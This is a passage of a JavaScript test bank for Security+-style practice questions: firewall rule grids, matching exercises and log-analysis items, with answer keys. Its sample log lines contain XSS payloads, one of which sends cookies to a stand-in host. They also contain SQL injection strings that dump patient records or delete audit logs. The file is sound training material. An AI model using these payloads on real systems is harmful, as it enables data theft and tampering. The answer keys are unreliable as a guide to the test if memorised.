"use strict";

/* ------------------------------------------------------------------ *
 * Interactive PBQ test bank — modeled on real CompTIA-style PBQs.
 *
 * Question types (interpreted by pbq.js test runner):
 *   - "dragdrop"  : drag/tap items into drop zones beside descriptions
 *   - "grid"      : a table whose cells are <select>s and/or text inputs
 *   - "logselect" : pick the malicious log lines + the attack type
 *   - "mcq"       : standard multiple choice (also pulled from PBQ_DATA)
 *
 * Each question carries enough data for the runner to render it, grade
 * it with PARTIAL credit, and render a read-only review afterward.
 *
 * Diagram HTML below is authored (never user input) -> safe to inject.
 * ------------------------------------------------------------------ */

/* ----- Firewall topology diagrams (authored HTML) ----- */
function fwNode(name, ip, cls) {
  return (
    '<div class="fw-node ' + (cls || "") + '">' +
    '<span class="fw-node-name">' + name + "</span>" +
    (ip ? '<span class="fw-node-ip">' + ip + "</span>" : "") +
    "</div>"
  );
}
function fwZone(label, nodesHtml, cls) {
  return (
    '<div class="fw-zone ' + (cls || "") + '">' +
    '<span class="fw-zone-label">' + label + "</span>" +
    '<div class="fw-nodes">' + nodesHtml + "</div></div>"
  );
}
function fwTopo(topLabel, topNodes, sideLabel, sideNodes, bottomLabel, bottomNodes) {
  return (
    '<div class="fw-topo">' +
    fwZone(topLabel, topNodes, "fw-top") +
    '<div class="fw-mid">' +
    '<div class="fw-node fw-cloud"><span class="fw-node-name">Internet</span></div>' +
    '<div class="fw-fire">🔥<span>Firewall</span></div>' +
    fwZone(sideLabel, sideNodes, "fw-side") +
    "</div>" +
    fwZone(bottomLabel, bottomNodes, "fw-bottom") +
    "</div>"
  );
}

const TOPO_SCREENED = fwTopo(
  "Screened Subnet",
  fwNode("Web", "10.10.10.10", "n-srv") + fwNode("Email", "10.10.10.20", "n-srv") +
    fwNode("Proxy", "10.10.10.30", "n-srv") + fwNode("VPN", "10.10.10.40", "n-srv"),
  "Corporate",
  fwNode("Admin", "172.20.20.5", "n-pc") + fwNode("Employee", "172.20.20.50", "n-pc"),
  "Internal Network",
  fwNode("File", "192.168.50.10", "n-db") + fwNode("Database", "192.168.50.20", "n-db") +
    fwNode("Application", "192.168.50.30", "n-db") + fwNode("Print", "192.168.50.40", "n-db")
);

const TOPO_HEALTH = fwTopo(
  "Medical Devices",
  fwNode("MRI", "10.100.50.10", "n-srv") + fwNode("CT Scanner", "10.100.50.20", "n-srv") +
    fwNode("PACS Server", "10.100.50.30", "n-srv") + fwNode("Patient Monitor", "10.100.50.40", "n-srv"),
  "Workstations",
  fwNode("Doctor", "192.168.100.5", "n-pc") + fwNode("Nurse", "192.168.100.10", "n-pc"),
  "Clinical Systems",
  fwNode("EMR Server", "172.25.10.10", "n-db") + fwNode("Pharmacy", "172.25.10.20", "n-db") +
    fwNode("Lab System", "172.25.10.30", "n-db") + fwNode("Billing", "172.25.10.40", "n-db")
);

const TOPO_SCADA = fwTopo(
  "ICS/SCADA Zone",
  fwNode("PLC", "10.50.100.10", "n-srv") + fwNode("SCADA", "10.50.100.20", "n-srv") +
    fwNode("HMI", "10.50.100.30", "n-srv") + fwNode("Historian", "10.50.100.40", "n-srv"),
  "Engineering",
  fwNode("Control Eng.", "192.168.75.10", "n-pc") + fwNode("Plant Operator", "192.168.75.20", "n-pc"),
  "Enterprise Zone",
  fwNode("ERP", "172.30.0.10", "n-db") + fwNode("File", "172.30.0.20", "n-db") +
    fwNode("Web", "172.30.0.30", "n-db") + fwNode("Email", "172.30.0.40", "n-db")
);

/* ----- Host option lists per topology ----- */
const HOSTS_SCREENED = [
  "Internet (Any)",
  "Web Server (10.10.10.10)", "Email Server (10.10.10.20)", "Proxy Server (10.10.10.30)", "VPN (10.10.10.40)",
  "Screened Subnet (10.10.10.0/24)",
  "Admin (172.20.20.5)", "Employee (172.20.20.50)", "Corporate Network (172.20.20.0/24)",
  "File Server (192.168.50.10)", "Database Server (192.168.50.20)", "Application Server (192.168.50.30)",
  "Print Server (192.168.50.40)", "Internal Network (192.168.50.0/24)",
];
const HOSTS_HEALTH = [
  "Internet (Any)",
  "MRI (10.100.50.10)", "CT Scanner (10.100.50.20)", "PACS Server (10.100.50.30)", "Patient Monitor (10.100.50.40)",
  "Medical Devices (10.100.50.0/24)",
  "Doctor (192.168.100.5)", "Nurse (192.168.100.10)", "Workstations (192.168.100.0/24)",
  "EMR Server (172.25.10.10)", "Pharmacy System (172.25.10.20)", "Lab System (172.25.10.30)",
  "Billing Server (172.25.10.40)", "Clinical Systems (172.25.10.0/24)",
];
const HOSTS_SCADA = [
  "Internet (Any)",
  "PLC (10.50.100.10)", "SCADA Server (10.50.100.20)", "HMI (10.50.100.30)", "Historian (10.50.100.40)",
  "ICS/SCADA Zone (10.50.100.0/24)",
  "Control Engineer (192.168.75.10)", "Plant Operator (192.168.75.20)", "Engineering (192.168.75.0/24)",
  "ERP (172.30.0.10)", "File (172.30.0.20)", "Web (172.30.0.30)", "Email (172.30.0.40)",
  "Enterprise Zone (172.30.0.0/24)",
];

const PROTO = ["TCP", "UDP", "ICMP", "Any"];
const ACTION = ["Allow", "Deny"];

function fwColumns(hosts) {
  return [
    { key: "source", label: "Source", kind: "select", options: hosts },
    { key: "destination", label: "Destination", kind: "select", options: hosts },
    { key: "port", label: "Port", kind: "text", placeholder: "Enter port" },
    { key: "protocol", label: "Protocol", kind: "select", options: PROTO },
    { key: "action", label: "Action", kind: "select", options: ACTION },
  ];
}

const FW_INSTRUCTIONS =
  "The firewall processes rules top-down and acts on the FIRST match. Enter one port number per rule (or ANY for all ports). Set Source, Destination, Port, Protocol, and Action to satisfy each requirement.";

const ATTACK_OPTIONS = [
  "Privilege Escalation", "SQL Injection", "Command Injection", "Directory Traversal",
  "Brute Force Attack", "Password Spraying", "DDoS Attack", "Cross-Site Scripting (XSS)",
  "Buffer Overflow", "On-Path Attack", "DNS Attack", "No Attack Suspected",
];

const PBQ_TEST = [
  /* ============================ FIREWALL GRIDS (network) ============= */
  {
    id: "fw-screened-a", type: "grid", category: "network",
    title: "Firewall Configuration", scenario: FW_INSTRUCTIONS, diagram: TOPO_SCREENED,
    columns: fwColumns(HOSTS_SCREENED),
    rows: [
      { prompt: "Allow secure web traffic from the Internet to the Web Server in the Screened Subnet.",
        answer: { source: "Internet (Any)", destination: "Web Server (10.10.10.10)", port: ["443"], protocol: "TCP", action: "Allow" } },
      { prompt: "Allow the Application Server to query the Database Server using PostgreSQL.",
        answer: { source: "Application Server (192.168.50.30)", destination: "Database Server (192.168.50.20)", port: ["5432"], protocol: "TCP", action: "Allow" } },
      { prompt: "Block all Telnet connections from the Employee workstation to any server in the Internal Network.",
        answer: { source: "Employee (172.20.20.50)", destination: "Internal Network (192.168.50.0/24)", port: ["23"], protocol: "TCP", action: "Deny" } },
      { prompt: "Allow the Proxy Server to make HTTP requests to the Internet on behalf of internal users.",
        answer: { source: "Proxy Server (10.10.10.30)", destination: "Internet (Any)", port: ["80"], protocol: "TCP", action: "Allow" } },
    ],
    explanation:
      "Secure web = HTTPS 443 (not 80). PostgreSQL = 5432. Telnet = 23 and must be DENIED (cleartext). The proxy fetches HTTP for users on port 80. Specific allow rules sit above the implicit deny-all.",
  },
  {
    id: "fw-screened-b", type: "grid", category: "network",
    title: "Firewall Configuration", scenario: FW_INSTRUCTIONS, diagram: TOPO_SCREENED,
    columns: fwColumns(HOSTS_SCREENED),
    rows: [
      { prompt: "Allow LDAP authentication queries from the Application Server to an Internet-based directory service.",
        answer: { source: "Application Server (192.168.50.30)", destination: "Internet (Any)", port: ["389"], protocol: "TCP", action: "Allow" } },
      { prompt: "Block all NetBIOS traffic from the entire Corporate Network to the Internal Network.",
        answer: { source: "Corporate Network (172.20.20.0/24)", destination: "Internal Network (192.168.50.0/24)", port: ["137", "138", "139"], protocol: ["TCP", "UDP", "Any"], action: "Deny" } },
      { prompt: "Allow the File Server to send syslog messages to an Internet logging service using the secure syslog protocol.",
        answer: { source: "File Server (192.168.50.10)", destination: "Internet (Any)", port: ["6514"], protocol: "TCP", action: "Allow" } },
      { prompt: "Allow Oracle database connections from the Application Server to the Database Server only.",
        answer: { source: "Application Server (192.168.50.30)", destination: "Database Server (192.168.50.20)", port: ["1521"], protocol: "TCP", action: "Allow" } },
    ],
    explanation:
      "LDAP = 389. NetBIOS = 137-139 (deny it). Secure syslog (over TLS) = 6514, not plain 514. Oracle = 1521. Each rule is scoped to the exact host/zone named.",
  },
  {
    id: "fw-screened-c", type: "grid", category: "network",
    title: "Firewall Configuration", scenario: FW_INSTRUCTIONS, diagram: TOPO_SCREENED,
    columns: fwColumns(HOSTS_SCREENED),
    rows: [
      { prompt: "Allow SNMP monitoring traffic from all Internal Network servers to send alerts to the Internet monitoring service.",
        answer: { source: "Internal Network (192.168.50.0/24)", destination: "Internet (Any)", port: ["162", "161"], protocol: "UDP", action: "Allow" } },
      { prompt: "Block all SMB file sharing from the Employee workstation to the File Server.",
        answer: { source: "Employee (172.20.20.50)", destination: "File Server (192.168.50.10)", port: ["445"], protocol: "TCP", action: "Deny" } },
      { prompt: "Allow the Administrator to manage the Web Server using secure remote administration.",
        answer: { source: "Admin (172.20.20.5)", destination: "Web Server (10.10.10.10)", port: ["22"], protocol: "TCP", action: "Allow" } },
      { prompt: "Allow SMTP relay from the Application Server through the Email Server to the Internet.",
        answer: { source: "Application Server (192.168.50.30)", destination: "Email Server (10.10.10.20)", port: ["25"], protocol: "TCP", action: "Allow" } },
    ],
    explanation:
      "SNMP sends alerts via traps on UDP 162 (161 is the query port). SMB = 445 (deny it). Secure remote admin = SSH 22. SMTP relay = 25 to the mail server.",
  },
  {
    id: "fw-health", type: "grid", category: "network",
    title: "Firewall Configuration", scenario: FW_INSTRUCTIONS, diagram: TOPO_HEALTH,
    columns: fwColumns(HOSTS_HEALTH),
    rows: [
      { prompt: "Allow the Lab System to query patient data from the EMR Server using a database connection.",
        answer: { source: "Lab System (172.25.10.30)", destination: "EMR Server (172.25.10.10)", port: ["1433", "3306", "5432", "1521"], protocol: "TCP", action: "Allow" } },
      { prompt: "Block all RDP connections from the Nurse Workstation to any device in the Medical Devices zone.",
        answer: { source: "Nurse (192.168.100.10)", destination: "Medical Devices (10.100.50.0/24)", port: ["3389"], protocol: "TCP", action: "Deny" } },
      { prompt: "Allow the Billing Server to send insurance claims to external payers over the Internet using HTTPS.",
        answer: { source: "Billing Server (172.25.10.40)", destination: "Internet (Any)", port: ["443"], protocol: "TCP", action: "Allow" } },
      { prompt: "Allow DNS resolution from the Pharmacy System to resolve medication database hostnames.",
        answer: { source: "Pharmacy System (172.25.10.20)", destination: "Internet (Any)", port: ["53"], protocol: "UDP", action: "Allow" } },
    ],
    explanation:
      "A database connection uses the DB port (MS SQL 1433 is common in healthcare; MySQL/PostgreSQL/Oracle also accepted). RDP = 3389 (deny to medical devices). HTTPS = 443. DNS = 53/UDP.",
  },
  {
    id: "fw-scada-1", type: "grid", category: "network",
    title: "Firewall Configuration", scenario: FW_INSTRUCTIONS, diagram: TOPO_SCADA,
    columns: fwColumns(HOSTS_SCADA),
    rows: [
      { prompt: "Allow LDAP authentication from the SCADA Server to query user credentials on the PLC Controller.",
        answer: { source: "SCADA Server (10.50.100.20)", destination: "PLC (10.50.100.10)", port: ["389"], protocol: "TCP", action: "Allow" } },
      { prompt: "Block all Internet access from the entire ICS/SCADA Zone to prevent external attacks.",
        answer: { source: "ICS/SCADA Zone (10.50.100.0/24)", destination: "Internet (Any)", port: ["ANY"], protocol: "Any", action: "Deny" } },
      { prompt: "Allow the Control Engineer to access the HMI Workstation using Remote Desktop for monitoring.",
        answer: { source: "Control Engineer (192.168.75.10)", destination: "HMI (10.50.100.30)", port: ["3389"], protocol: "TCP", action: "Allow" } },
      { prompt: "Allow secure LDAP authentication from the PLC Controller to the HMI Workstation for user verification.",
        answer: { source: "PLC (10.50.100.10)", destination: "HMI (10.50.100.30)", port: ["636"], protocol: "TCP", action: "Allow" } },
    ],
    explanation:
      "LDAP = 389, secure LDAP (LDAPS) = 636. 'Block all Internet access' = Port ANY, Protocol ANY, Action Deny. Remote Desktop = RDP 3389. ICS/SCADA networks are kept off the Internet by design.",
  },
  {
    id: "fw-scada-2", type: "grid", category: "network",
    title: "Firewall Configuration", scenario: FW_INSTRUCTIONS, diagram: TOPO_SCADA,
    columns: fwColumns(HOSTS_SCADA),
    rows: [
      { prompt: "Allow DNS queries from the SCADA Server to resolve hostnames for the Historian Database.",
        answer: { source: "SCADA Server (10.50.100.20)", destination: "Historian (10.50.100.40)", port: ["53"], protocol: "UDP", action: "Allow" } },
      { prompt: "Block all RDP connections from the Plant Operator to the SCADA Server to prevent unauthorized control access.",
        answer: { source: "Plant Operator (192.168.75.20)", destination: "SCADA Server (10.50.100.20)", port: ["3389"], protocol: "TCP", action: "Deny" } },
      { prompt: "Allow the Web Server to communicate with the ERP Server using HTTPS for secure data exchange.",
        answer: { source: "Web (172.30.0.30)", destination: "ERP (172.30.0.10)", port: ["443"], protocol: "TCP", action: "Allow" } },
      { prompt: "Allow secure LDAP authentication from the PLC Controller to the HMI Workstation for user verification.",
        answer: { source: "PLC (10.50.100.10)", destination: "HMI (10.50.100.30)", port: ["636"], protocol: "TCP", action: "Allow" } },
    ],
    explanation:
      "DNS = 53/UDP. RDP = 3389 (deny operator→SCADA). HTTPS = 443. Secure LDAP = LDAPS 636.",
  },

  /* ============================ DRAG / DROP ========================= */
  {
    id: "dd-net-controls", type: "dragdrop", category: "network",
    title: "Network Security Controls",
    scenario: "Your organization is implementing various network security controls to protect against different types of threats. Match each control to its description.",
    items: ["NAC", "VPN", "Firewall", "IDS"],
    zones: [
      { prompt: "A network perimeter device that controls traffic flow based on predetermined security rules and policies.", answer: ["Firewall"] },
      { prompt: "A monitoring system that analyzes network traffic and system activities for malicious patterns and policy violations.", answer: ["IDS"] },
      { prompt: "A secure encrypted tunnel that allows remote users to access private network resources over the internet.", answer: ["VPN"] },
      { prompt: "A security framework that evaluates and controls device access to network resources based on compliance policies.", answer: ["NAC"] },
    ],
    explanation:
      "Firewall = rule-based perimeter traffic control. IDS = passive monitoring/alerting on malicious patterns. VPN = encrypted remote-access tunnel. NAC = admission control based on device compliance posture.",
  },
  {
    id: "dd-physical-1", type: "dragdrop", category: "controls",
    title: "Physical Security",
    scenario: "Your organization is implementing various physical security controls to protect facility perimeters and control access points. Match each control to its scenario.",
    items: ["Video Surveillance", "Bollards", "Fencing", "Lighting"],
    zones: [
      { prompt: "Reinforced concrete posts installed around the main entrance to prevent vehicle ramming attacks against the building.", answer: ["Bollards"] },
      { prompt: "Eight-foot chain-link barriers topped with barbed wire surrounding the facility's backup generator area.", answer: ["Fencing"] },
      { prompt: "Multiple CCTVs positioned at building corners with 90-day retention covering all parking lot areas and entrances.", answer: ["Video Surveillance"] },
      { prompt: "Motion-activated LED fixtures installed in the rear loading dock area to eliminate shadows and dark zones.", answer: ["Lighting"] },
    ],
    explanation:
      "Concrete posts vs vehicles = bollards. Chain-link + barbed wire perimeter = fencing. CCTV with retention = video surveillance. LED fixtures removing dark zones = lighting.",
  },
  {
    id: "dd-physical-2", type: "dragdrop", category: "controls",
    title: "Physical Security",
    scenario: "Your organization is implementing a comprehensive defense-in-depth strategy for physical security. Match each control to its appropriate deployment in the layered security model.",
    items: ["Access Control Vestibule", "Bollards", "Lighting", "Security Guard"],
    zones: [
      { prompt: "Steel pipe barriers filled with concrete protecting the front plaza from vehicle-based attacks targeting the building entrance.", answer: ["Bollards"] },
      { prompt: "A two-door entry system protecting the network operations center that prevents tailgating by requiring badge authentication at each door sequentially.", answer: ["Access Control Vestibule"] },
      { prompt: "Personnel positioned at the reception area who verify appointments, escort visitors, and maintain a visitor log with photo identification checks.", answer: ["Security Guard"] },
      { prompt: "High-intensity LED fixtures installed around the building perimeter providing minimum 2 foot-candles of illumination to eliminate concealment areas.", answer: ["Lighting"] },
    ],
    explanation:
      "Concrete-filled steel posts = bollards. Two-door anti-tailgating entry = access control vestibule (mantrap). Reception personnel verifying visitors = security guard. Perimeter illumination = lighting.",
  },
  {
    id: "dd-physical-sensors", type: "dragdrop", category: "controls",
    title: "Physical Security",
    scenario: "A financial institution is deploying advanced detection systems to identify unauthorized access attempts and monitor restricted areas. Identify the correct technology for each scenario.",
    items: ["Video Surveillance", "Microwave Sensors", "Pressure Sensors", "Ultrasonic Sensors"],
    zones: [
      { prompt: "Detection system in the vault that emits sound waves above 20 kHz and monitors for disturbances in the reflected pattern caused by movement.", answer: ["Ultrasonic Sensors"] },
      { prompt: "Sensors installed in the ATM vestibule that transmit radio frequency waves through walls and detect motion in adjacent spaces.", answer: ["Microwave Sensors"] },
      { prompt: "Specialized floor tiles in the safe deposit box area that detect and alert when force is applied by someone standing on them.", answer: ["Pressure Sensors"] },
      { prompt: "IP-based camera system with facial recognition capabilities monitoring all teller stations and customer service areas with 24/7 recording.", answer: ["Video Surveillance"] },
    ],
    explanation:
      "Sound waves above 20 kHz = ultrasonic. RF waves through walls = microwave. Force/weight on floor tiles = pressure sensors. Cameras with facial recognition = video surveillance.",
  },
  {
    id: "dd-auth", type: "dragdrop", category: "controls",
    title: "Authentication Methods",
    scenario: "Drag and drop each authentication method into the correct category based on the factor it represents.",
    items: ["Smart Card", "IP Address", "Retina Scan", "Pattern Lock", "Security Token", "Facial Recognition"],
    zones: [
      { prompt: "Knowledge Factor (something you know)", answer: ["Pattern Lock"] },
      { prompt: "Possession Factor (something you have)", answer: ["Smart Card", "Security Token"] },
      { prompt: "Inherence Factor (something you are)", answer: ["Retina Scan", "Facial Recognition"] },
      { prompt: "Location Factor (somewhere you are)", answer: ["IP Address"] },
    ],
    explanation:
      "Pattern lock = something you KNOW. Smart card and security token = something you HAVE. Retina scan and facial recognition are biometrics = something you ARE. IP address = somewhere you ARE (location).",
  },
  {
    id: "dd-deception-1", type: "dragdrop", category: "controls",
    title: "Deception Technologies",
    scenario: "A financial institution is deploying deception technologies to protect sensitive data and detect potential insider threats. Match each scenario with the appropriate deception technology.",
    items: ["Honeytoken", "Honeypot", "Honeynet", "Honeyfile"],
    zones: [
      { prompt: "A FTP server appearing to contain backup files of customer transaction data, recording all access attempts.", answer: ["Honeypot"] },
      { prompt: "An Excel spreadsheet titled executive_compensation_2025.xlsx placed in the HR director's shared folder.", answer: ["Honeyfile"] },
      { prompt: "A fake credit card number inserted into the payment database that alerts when processed or exported.", answer: ["Honeytoken"] },
      { prompt: "A simulated banking infrastructure with ATM controllers, core banking systems, and payment processors on a monitored network segment.", answer: ["Honeynet"] },
    ],
    explanation:
      "A decoy server/service = honeypot. A single decoy file = honeyfile. A single decoy data element (fake card number) = honeytoken. A whole network of decoys = honeynet.",
  },
  {
    id: "dd-deception-2", type: "dragdrop", category: "controls",
    title: "Deception Technologies",
    scenario: "A healthcare organization is implementing deception controls to protect patient data and detect unauthorized access to medical systems. Identify the correct type of deception technology for each implementation.",
    items: ["Honeyfile", "Honeytoken", "Honeynet", "Honeypot"],
    zones: [
      { prompt: "A decoy server running PACS (Picture Archiving and Communication System) software with fake medical imaging files that is monitored for unauthorized access.", answer: ["Honeypot"] },
      { prompt: "A collection of systems simulating an electronic health record (EHR) environment with patient databases, pharmacy systems, and lab interfaces.", answer: ["Honeynet"] },
      { prompt: "A fabricated patient record with a unique medical record number (MRN) that triggers alerts when accessed or modified.", answer: ["Honeytoken"] },
      { prompt: "A CSV-formatted document named patient_contact_information.csv stored on the hospital's file server containing fake patient data.", answer: ["Honeyfile"] },
    ],
    explanation:
      "A single decoy server = honeypot. A collection/network of decoy systems = honeynet. A fabricated record/data element = honeytoken. A single decoy file (CSV) = honeyfile.",
  },
  {
    id: "dd-social", type: "dragdrop", category: "controls",
    title: "Social Engineering",
    scenario: "Consider the following terms associated with various social engineering attacks. Match each attack with the technique being used.",
    items: ["Vishing", "Phishing", "Whaling", "Pretexting"],
    zones: [
      { prompt: "A fraudulent attempt to obtain sensitive information by disguising oneself as a trustworthy entity in electronic communications, typically via email.", answer: ["Phishing"] },
      { prompt: "A voice-based social engineering attack conducted over the telephone system to trick victims into revealing sensitive information.", answer: ["Vishing"] },
      { prompt: "Creating a fabricated scenario or false identity to establish trust and manipulate a victim into divulging confidential information.", answer: ["Pretexting"] },
      { prompt: "A highly targeted phishing attack directed at senior executives, board members, or other high-profile individuals within an organization.", answer: ["Whaling"] },
    ],
    explanation:
      "Email impersonation = phishing. Voice/phone = vishing. Fabricated scenario/identity = pretexting. Phishing aimed at executives/VIPs = whaling.",
  },

  /* ============================ TWO-DROPDOWN GRIDS ================== */
  {
    id: "grid-controls", type: "grid", category: "controls",
    title: "Categorize Security Controls by Type and Category",
    scenario: "You are a newly hired security analyst. Categorize each control by its control category (Technical, Managerial, Operational, Physical) and its control type (Preventive, Detective, Corrective, Compensating, Deterrent, Directive).",
    columns: [
      { key: "category", label: "Control Category", kind: "select", options: ["Technical", "Managerial", "Operational", "Physical"] },
      { key: "type", label: "Control Type", kind: "select", options: ["Preventive", "Detective", "Corrective", "Compensating", "Deterrent", "Directive"] },
    ],
    rowLabel: "Control",
    rows: [
      { prompt: "Honeypot System", answer: { category: "Technical", type: "Detective" } },
      { prompt: "Multi-factor Authentication (MFA)", answer: { category: "Technical", type: "Preventive" } },
      { prompt: "Backup Policy", answer: { category: "Managerial", type: "Corrective" } },
      { prompt: "Security Guard", answer: { category: "Operational", type: ["Deterrent", "Preventive"] } },
      { prompt: "Password Policy Enforcement Tool", answer: { category: "Technical", type: "Preventive" } },
    ],
    explanation:
      "Honeypot = Technical + Detective (technology that detects intruders). MFA and a password-enforcement tool = Technical + Preventive. A backup POLICY = Managerial (administrative) + Corrective (restores after an incident). A security guard = Operational + Deterrent (also acts preventively).",
  },
  {
    id: "grid-threat-actors", type: "grid", category: "controls",
    title: "Classify Threat Actors and Their Motivations",
    scenario: "Identify the correct threat actor for each description below, then select the most likely motivation for the attack.",
    columns: [
      { key: "actor", label: "Threat Actor", kind: "select", options: ["Insider Threat", "Organized Crime", "Hacktivist", "Nation-state Actor", "Unskilled Attacker", "Shadow IT"] },
      { key: "motivation", label: "Motivation", kind: "select", options: ["Financial Gain", "Revenge", "Philosophical/Ethical Beliefs", "Espionage", "Disruption/Chaos", "Service Disruption"] },
    ],
    rowLabel: "Threat Scenario",
    rows: [
      { prompt: "A recently terminated employee uses his credentials to destroy customer records because he was terminated.",
        answer: { actor: "Insider Threat", motivation: "Revenge" } },
      { prompt: "A transnational organization's crew encrypts corporate files and demands payment in cryptocurrency.",
        answer: { actor: "Organized Crime", motivation: "Financial Gain" } },
      { prompt: "A group breaches a pharmaceutical company and leaks cost and profit data to show the company is charging far more than they should.",
        answer: { actor: "Hacktivist", motivation: "Philosophical/Ethical Beliefs" } },
      { prompt: "A foreign country's cyber unit infiltrates an energy provider to harvest SCADA intelligence.",
        answer: { actor: "Nation-state Actor", motivation: "Espionage" } },
      { prompt: "An attacker uses an off-the-shelf hacking toolkit to deface a school's website.",
        answer: { actor: "Unskilled Attacker", motivation: "Disruption/Chaos" } },
    ],
    explanation:
      "Own credentials + 'because he was terminated' = insider threat, revenge. Ransomware + crypto demand = organized crime, financial gain. Leaking to expose 'wrongdoing' = hacktivist, beliefs. Foreign state + SCADA intel = nation-state, espionage. Off-the-shelf toolkit + defacement = unskilled attacker, disruption.",
  },

  /* ============================ LOG ANALYSIS (logs) ================ */
  {
    id: "log-xss", type: "logselect", category: "logs",
    title: "Log Analysis",
    scenario: "Review the e-commerce product review system log entries, identify any lines that show signs of malicious activity by selecting them, and then select the type of attack observed.",
    attackOptions: ATTACK_OPTIONS, attackAnswer: "Cross-Site Scripting (XSS)",
    lines: [
      { level: "INFO", text: '2025-10-03 20:12:34 - 45.78.90.123 - "GET /shop.php HTTP/1.1" 200', bad: false },
      { level: "INFO", text: '2025-10-03 20:12:51 - 45.78.90.123 - "GET /product.php?id=8901 HTTP/1.1" 200', bad: false },
      { level: "INFO", text: '2025-10-03 20:13:08 - 45.78.90.123 - "POST /review.php?text=<object data=data:text/html,<script>window.location=\'https://phishing.xyz\'+document.cookie</script>" 200', bad: true },
      { level: "INFO", text: '2025-10-03 20:13:25 - 45.78.90.123 - "GET /cart.php HTTP/1.1" 200', bad: false },
      { level: "INFO", text: '2025-10-03 20:13:59 - 45.78.90.123 - "GET /deals.php HTTP/1.1" 200', bad: false },
      { level: "INFO", text: "2025-10-03 20:14:16 - 45.78.90.123 - \"POST /qa.php?question=<style>@import'javascript:eval(String.fromCharCode(97,108,101,114,116,...))'</style>\" 200", bad: true },
      { level: "INFO", text: '2025-10-03 20:14:50 - 45.78.90.123 - "GET /shipping.php HTTP/1.1" 200', bad: false },
      { level: "INFO", text: '2025-10-03 20:15:24 - 45.78.90.123 - "POST /subscribe.php?email=<base href=\\"javascript:evil.com/%250Aalert(document.cookie)//\\">" 200', bad: true },
      { level: "INFO", text: '2025-10-03 20:15:41 - 45.78.90.123 - "GET /logout.php HTTP/1.1" 302', bad: false },
    ],
    explanation:
      "Three review/Q&A/subscribe fields contain HTML/JavaScript (<script>, <object>, <style>, <base>, javascript:, document.cookie) that runs in other users' browsers to steal cookies or redirect them — Cross-Site Scripting (XSS). No SQL keywords, shell metacharacters, or ../ traversal appear, so it is not SQLi, command injection, or directory traversal.",
  },
  {
    id: "log-sqli-portal", type: "logselect", category: "logs",
    title: "Log Analysis",
    scenario: "Review the customer portal database log entries, identify any lines that show signs of malicious activity by selecting them, and then select the type of attack observed.",
    attackOptions: ATTACK_OPTIONS, attackAnswer: "SQL Injection",
    lines: [
      { level: "INFO", text: '2025-10-03 11:42:18 - 156.78.90.123 - "GET /portal.php HTTP/1.1" 200 4892', bad: false },
      { level: "INFO", text: '2025-10-03 11:42:35 - 156.78.90.123 - "GET /orders.php?user_id=8765 HTTP/1.1" 200 3421', bad: false },
      { level: "INFO", text: '2025-10-03 11:43:09 - 156.78.90.123 - "GET /invoice.php?id=100 OR 1=1 ORDER BY total DESC LIMIT 10-- HTTP/1.1" 200 8934', bad: true },
      { level: "INFO", text: '2025-10-03 11:43:26 - 156.78.90.123 - "GET /shipping.php HTTP/1.1" 200 1892', bad: false },
      { level: "INFO", text: '2025-10-03 11:44:00 - 156.78.90.123 - "GET /returns.php HTTP/1.1" 200 2734', bad: false },
      { level: "ERROR", text: '2025-10-03 11:44:17 - 156.78.90.123 - "POST /update.php?email=test@mail.com\';UPDATE customers SET credit_limit=999999 WHERE username=\'attacker\'-- HTTP/1.1" 500 0', bad: true },
      { level: "INFO", text: '2025-10-03 11:44:51 - 156.78.90.123 - "GET /recommendations.php HTTP/1.1" 200 5234', bad: false },
      { level: "INFO", text: '2025-10-03 11:45:25 - 156.78.90.123 - "GET /logout.php HTTP/1.1" 302 0', bad: false },
    ],
    explanation:
      "Two parameters carry SQL: a tautology ('OR 1=1' with -- comment) to dump invoices, and a stacked '; UPDATE customers SET credit_limit... WHERE username=\\'attacker\\'--' to tamper with the database. Quotes, OR 1=1, UPDATE, and -- comments are SQL Injection.",
  },
  {
    id: "log-sqli-health", type: "logselect", category: "logs",
    title: "Log Analysis",
    scenario: "Review the healthcare portal access log entries, identify any lines that show signs of malicious activity by selecting them, and then select the type of attack observed.",
    attackOptions: ATTACK_OPTIONS, attackAnswer: "SQL Injection",
    lines: [
      { level: "INFO", text: '2025-10-03 09:15:33 - 23.45.67.89 - "GET /patients.php HTTP/1.1" 200 5234', bad: false },
      { level: "INFO", text: '2025-10-03 09:15:50 - 23.45.67.89 - "GET /appointments.php HTTP/1.1" 200 3421', bad: false },
      { level: "ERROR", text: '2025-10-03 09:16:07 - 23.45.67.89 - "GET /patient.php?id=5432\' UNION SELECT ssn,dob,diagnosis FROM medical_records-- HTTP/1.1" 200 12456', bad: true },
      { level: "INFO", text: '2025-10-03 09:16:41 - 23.45.67.89 - "GET /prescriptions.php HTTP/1.1" 200 4156', bad: false },
      { level: "INFO", text: '2025-10-03 09:17:15 - 23.45.67.89 - "POST /login.php?username=dr_smith\' OR \'1\'=\'1\'--&password=ignored HTTP/1.1" 200 1234', bad: true },
      { level: "INFO", text: '2025-10-03 09:17:49 - 23.45.67.89 - "GET /labs.php HTTP/1.1" 200 2345', bad: false },
      { level: "ERROR", text: '2025-10-03 09:18:06 - 23.45.67.89 - "GET /search.php?name=Smith\';DELETE FROM audit_logs WHERE 1=1-- HTTP/1.1" 500 0', bad: true },
      { level: "INFO", text: '2025-10-03 09:18:40 - 23.45.67.89 - "GET /logout.php HTTP/1.1" 302 0', bad: false },
    ],
    explanation:
      "Three parameters carry SQL: a UNION SELECT to exfiltrate ssn/dob/diagnosis, an OR '1'='1'-- login bypass, and a stacked ';DELETE FROM audit_logs' to destroy evidence. UNION SELECT, OR '1'='1', DELETE, quotes, and -- are SQL Injection.",
  },
  {
    id: "log-dns-ddos", type: "logselect", category: "logs",
    title: "Log Analysis",
    scenario: "Review the ISP's network infrastructure log entries, identify any lines that show signs of malicious activity by selecting them, and then select the type of attack observed.",
    attackOptions: ATTACK_OPTIONS, attackAnswer: "DDoS Attack",
    lines: [
      { level: "INFO", text: "2025-10-03 09:00:15 - client 100.64.0.45: query www.google.com IN A -> 142.250.80.46", bad: false },
      { level: "INFO", text: "2025-10-03 09:00:54 - client 100.64.0.89: query www.netflix.com IN A -> 54.208.29.140", bad: false },
      { level: "INFO", text: "2025-10-03 09:01:30 - NXDOMAIN attack detected: 50,000 queries for random.invalid-tld.xyz from 45.123.67.89 in 60 seconds", bad: true },
      { level: "INFO", text: "2025-10-03 09:01:53 - client 100.64.0.134: query mail.yahoo.com IN A -> 98.137.11.164", bad: false },
      { level: "INFO", text: "2025-10-03 09:02:23 - Query flood: 25,000 queries/sec from IPs exceeding capacity", bad: true },
